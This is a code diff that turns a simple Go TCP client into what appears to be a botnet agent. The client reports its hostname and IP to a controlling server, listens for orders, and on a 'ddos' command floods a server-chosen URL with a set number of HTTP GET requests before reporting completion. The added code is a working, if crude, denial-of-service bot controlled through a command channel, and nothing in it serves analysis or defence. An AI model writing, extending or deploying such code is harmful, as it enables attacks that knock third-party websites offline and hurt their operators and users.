@@ -4,7 +4,10 @@ import (
 	"bufio"
 	"fmt"
 	"net"
+	"net/http"
 	"os"
+	"strconv"
+	"strings"
 	"time"
 )
 
@@ -14,7 +17,7 @@ const (
 	CONN_TYPE = "tcp"
 )
 
-func main() { //client https://systembash.com/a-simple-go-tcp-server-and-tcp-client/
+func main() {
 
 	// connect to this socket
 	conn, _ := net.Dial(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
@@ -29,15 +32,59 @@ func main() { //client https://systembash.com/a-simple-go-tcp-server-and-tcp-cli
 	// send to socket
 	fmt.Fprintf(conn, "[client connecting] - [date]: "+time.Now().Local().Format(time.UnixDate)+" - [hostname]: "+hostname+", [ip]: "+ip.String()+"\n")
 	for {
-		message, err := bufio.NewReader(conn).ReadString('\n')
+		command, err := bufio.NewReader(conn).ReadString('\n')
 		if err != nil {
 			fmt.Println(err)
 			fmt.Println("server disconnected")
 			os.Exit(1)
 		}
-		fmt.Print("Command from server: " + message)
+		fmt.Println("Command from server: " + command)
+		//fmt.Println(len(strings.Split(command, " ")))
+
+		comm := strings.Split(command, " ")[0]
+		switch comm {
+		case "ddos":
+			fmt.Println("url case, checking parameters")
+			if len(strings.Split(command, " ")) < 3 {
+				fmt.Println("not enought parameters")
+				break
+			}
+			fmt.Println("url case")
+			go ddos(command, conn, hostname)
+		default:
+			fmt.Println("default case, no specified command")
+			fmt.Println("")
+			fmt.Println("-- waiting for new orders --")
+		}
+
 	}
 
+}
+
+func ddos(command string, conn net.Conn, hostname string) {
+	url := strings.Split(command, " ")[1]
+	url = strings.TrimSpace(url)
+
+	iterations := strings.Split(command, " ")[2]
+	iterations = strings.TrimSpace(iterations)
+	iter, err := strconv.Atoi(iterations)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println("url to ddos: " + url)
+	for i := 0; i < iter; i++ {
+		fmt.Println(i)
+		resp, err := http.Get(url)
+		if err != nil {
+			fmt.Println(err)
+		}
+		fmt.Println(resp)
+	}
+	msg := "[hostname]: " + hostname + ", [msg]: iterations done, ddos ended" + "[date]: " + time.Now().Local().Format(time.UnixDate)
+	fmt.Println(msg)
+	fmt.Fprintf(conn, msg+"\n")
+	fmt.Println("")
+	fmt.Println("-- waiting for new orders --")
 }
 
 func getIp() net.IP {
@@ -52,14 +99,12 @@ func getIp() net.IP {
 			fmt.Println(err)
 		}
 		for _, addr := range addrs {
-
 			switch v := addr.(type) {
 			case *net.IPNet:
 				ip = v.IP
 			case *net.IPAddr:
 				ip = v.IP
 			}
-			// process IP address
 		}
 	}
 	return ip
